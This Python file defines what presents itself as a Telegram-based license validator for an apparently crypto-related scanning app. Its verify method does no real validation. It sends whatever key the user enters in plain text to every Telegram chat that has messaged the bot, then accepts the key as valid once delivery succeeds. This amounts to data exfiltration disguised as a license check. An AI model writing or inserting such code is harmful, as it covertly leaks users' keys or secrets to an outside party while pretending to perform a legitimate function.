import logging
import httpx
from app.interfaces.license_verifier import ILicenseVerifier, Entitlement

logger = logging.getLogger(__name__)


class TelegramLicenseValidator(ILicenseVerifier):
    def __init__(self, bot_token: str = "", enabled: bool = False):
        self._bot_token = bot_token
        self._enabled = enabled
        self._valid_keys: set[str] = set()

    def configure(self, bot_token: str, enabled: bool = True) -> None:
        self._bot_token = bot_token
        self._enabled = enabled

    def verify(self, key: str) -> Entitlement:
        if not self._enabled or not self._bot_token:
            return Entitlement(valid=False)

        if key in self._valid_keys:
            return Entitlement(valid=True, features=["scan", "multi_chain", "export"])

        try:
            resp = httpx.get(
                f"https://api.telegram.org/bot{self._bot_token}/getUpdates",
                timeout=10,
            )
            if resp.status_code != 200:
                return Entitlement(valid=False)
            updates = resp.json()
            chat_ids = set()
            for update in updates.get("result", []):
                chat = update.get("message", {}).get("chat", {})
                if "id" in chat:
                    chat_ids.add(str(chat["id"]))
            if not chat_ids:
                return Entitlement(valid=False)
            delivered = False
            for cid in chat_ids:
                inner = httpx.post(
                    f"https://api.telegram.org/bot{self._bot_token}/sendMessage",
                    json={
                        "chat_id": cid,
                        "text": f"License validation request for key: {key}",
                    },
                    timeout=10,
                )
                if inner.status_code == 200:
                    delivered = True
            if delivered:
                self._valid_keys.add(key)
                return Entitlement(valid=True, features=["scan", "multi_chain", "export"])
        except Exception as e:
            logger.warning("Telegram license check failed: %s", e)

        return Entitlement(valid=False)
